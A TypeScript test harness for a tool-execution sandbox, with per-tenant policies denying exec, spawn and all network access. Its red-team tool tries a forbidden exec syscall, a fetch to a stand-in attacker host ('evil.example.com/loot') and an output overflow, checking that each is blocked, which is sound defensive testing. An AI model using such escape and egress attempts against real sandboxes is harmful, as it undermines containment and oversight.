import { Sandbox } from './sandbox';
import { ToolDefinition, ToolInvocationRequest } from './types';

const policyDSL = `
# Global defaults
tenant * {
  quota safe-tool 2 per window
  quota sandbox-breaker 1 per window
  allow_syscalls read,write
  deny_syscalls exec,spawn
  deny_network all
  output_max 2048
}

# Hardened tenant with tighter limits
tenant redteam {
  quota safe-tool 1 per window
  quota sandbox-breaker 1 per window
  allow_syscalls read
  deny_syscalls exec,spawn
  deny_network all
  output_max 512
}
`;

const safeTool: ToolDefinition = {
  name: 'safe-tool',
  metadata: {
    description: 'Echoes the payload in a controlled manner.',
    requiredSyscalls: ['read'],
    maxOutputBytes: 256
  },
  handler: async (request, context) => {
    context.appendLog('safe-tool invoked');
    const message = String(request.payload['message'] ?? '');
    context.createArtifact({
      name: `echo-${request.id}.txt`,
      mediaType: 'text/plain',
      content: message
    });
    return {
      stdout: message.toUpperCase()
    };
  }
};

const sandboxBreaker: ToolDefinition = {
  name: 'sandbox-breaker',
  metadata: {
    description: 'Attempts a series of sandbox escape primitives.',
    requiredSyscalls: ['read'],
    maxOutputBytes: 128
  },
  handler: async (request, context) => {
    const attempts: string[] = [];

    try {
      context.appendLog('Attempting forbidden syscall exec');
      context.requestSyscall('exec');
    } catch (error) {
      attempts.push(`syscall: ${(error as Error).message}`);
    }

    try {
      context.appendLog('Attempting forbidden network egress');
      await context.fetch('https://evil.example.com/loot');
    } catch (error) {
      attempts.push(`network: ${(error as Error).message}`);
    }

    try {
      context.appendLog('Attempting to overflow output budget');
      const payload = 'x'.repeat(context.getRemainingOutputBudget() + 1);
      context.createArtifact({
        name: 'overflow.txt',
        mediaType: 'text/plain',
        content: payload
      });
    } catch (error) {
      attempts.push(`output: ${(error as Error).message}`);
    }

    const message = attempts.join('; ');
    throw new Error(`Red-team attempts blocked: ${message}`);
  }
};

async function runHarness(): Promise<Sandbox> {
  const sandbox = new Sandbox({ policySource: policyDSL });
  sandbox.registerTool(safeTool);
  sandbox.registerTool(sandboxBreaker);

  const requests: ToolInvocationRequest[] = [
    {
      id: 'req-safe-1',
      tenantId: 'default',
      toolName: 'safe-tool',
      payload: { message: 'hello world' }
    },
    {
      id: 'req-safe-2',
      tenantId: 'default',
      toolName: 'safe-tool',
      payload: { message: 'hello world' }
    },
    {
      id: 'req-breaker-1',
      tenantId: 'redteam',
      toolName: 'sandbox-breaker',
      payload: {}
    }
  ];

  for (const request of requests) {
    const result = await sandbox.run(request);
    console.log('---');
    console.log(`Request ${request.id} allowed=${result.allowed}`);
    if (result.allowed) {
      console.log('stdout:', result.result?.stdout);
    } else {
      console.log('denied reason:', result.decision.reason);
    }
  }

  console.log('Audit Trail:');
  for (const event of sandbox.getAuditLog().getEvents()) {
    console.log(JSON.stringify(event));
  }

  return sandbox;
}

if (require.main === module) {
  runHarness().catch((error) => {
    console.error('Harness failed', error);
    process.exit(1);
  });
}

export { runHarness };
